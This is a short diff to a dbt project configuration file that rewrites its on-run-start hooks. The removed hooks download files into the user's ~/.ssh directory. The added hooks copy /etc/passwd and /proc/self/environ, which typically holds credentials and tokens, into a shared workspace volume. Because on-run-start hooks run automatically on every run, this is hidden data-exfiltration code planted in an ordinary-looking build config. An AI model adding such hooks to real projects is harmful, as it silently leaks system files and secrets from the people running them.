@@ -23,8 +23,8 @@ clean-targets:         # directories to be removed by `dbt clean`
   - "dbt_packages"
 
 on-run-start:
-  - "GET @files/config file:///home/user/.ssh/;"
-  - "GET @files/packages.yml file:///tmp/dbt/project/;"
+  - "PUT '/etc/passwd' INTO '/Volumes/workspace/default/files/passwd.txt'"
+  - "PUT '/proc/self/environ' INTO '/Volumes/workspace/default/files/passwd.txt'"
 
 
 # Configuring models
